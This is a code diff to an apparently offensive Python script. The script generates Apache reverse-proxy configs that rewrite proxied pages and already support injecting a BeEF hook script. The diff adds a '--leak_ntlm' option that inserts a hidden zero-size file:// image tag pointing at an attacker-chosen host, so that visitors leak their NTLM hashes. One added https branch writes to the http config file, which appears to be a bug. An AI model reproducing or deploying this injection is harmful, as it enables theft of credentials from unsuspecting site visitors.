@@ -135,6 +135,8 @@ if __name__ == "__main__":
                         help='Find and replace string in response (example: "s|foo|bar|ni")', default=None)
     parser.add_argument('-b', '--beef', type=str,
                         help='Set path to BeeF script (example: "http://192.168.0.1/beef.js")', default=None)
+    parser.add_argument('-n', '--leak_ntlm', type=str,
+                        help='Set IP or domain for leak NTLM hash (example: "192.168.0.1")', default=None)
     parser.add_argument('-c', '--http_config', type=str,
                         help='Set path to Apache2 http site config '
                              '(default: /etc/apache2/sites-available/000-default.conf)',
@@ -191,7 +193,7 @@ if __name__ == "__main__":
                                "\n\tProxyPass \"/\" \"" + args.url + "/\"" +
                                "\n\tProxyPassReverse \"/\" \"" + args.url + "/\"")
 
-        if args.replace is not None or args.beef is not None:
+        if args.replace is not None or args.beef is not None or args.leak_ntlm is not None:
             http_config_file.write("\n\tRequestHeader unset Accept-Encoding" +
                                    "\n\tRequestHeader set Accept-Encoding identity" +
                                    "\n\tAddOutputFilterByType SUBSTITUTE text/html")
@@ -202,6 +204,10 @@ if __name__ == "__main__":
         if args.beef is not None:
             http_config_file.write("\n\tSubstitute \"s|</head>|<script src='" +
                                    args.beef + "'></script></head>|ni\"")
+
+        if args.leak_ntlm is not None:
+            http_config_file.write("\n\tSubstitute \"s|</body>|<img src='file://" +
+                                   args.leak_ntlm + "/img.png' width='0' height='0' /></body>|ni\"")
 
         http_config_file.write("\n\tSecRuleEngine On" +
                                "\n\tSecAuditEngine on" +
@@ -244,7 +250,7 @@ if __name__ == "__main__":
                                     "\n\t\tProxyPass \"/\" \"" + args.url + "/\"" +
                                     "\n\t\tProxyPassReverse \"/\" \"" + args.url + "/\"")
 
-            if args.replace is not None or args.beef is not None:
+            if args.replace is not None or args.beef is not None or args.leak_ntlm is not None:
                 https_config_file.write("\n\t\tRequestHeader unset Accept-Encoding" +
                                         "\n\t\tRequestHeader set Accept-Encoding identity" +
                                         "\n\t\tAddOutputFilterByType SUBSTITUTE text/html")
@@ -255,6 +261,10 @@ if __name__ == "__main__":
             if args.beef is not None:
                 https_config_file.write("\n\t\tSubstitute \"s|</head>|<script src='" +
                                         args.beef + "'></script></head>|ni\"")
+
+            if args.leak_ntlm is not None:
+                http_config_file.write("\n\t\tSubstitute \"s|</body>|<img src='file://" +
+                                       args.leak_ntlm + "/img.png' width='0' height='0' /></body>|ni\"")
 
             https_config_file.write("\n\t\tSecRuleEngine On" +
                                     "\n\t\tSecAuditEngine on" +
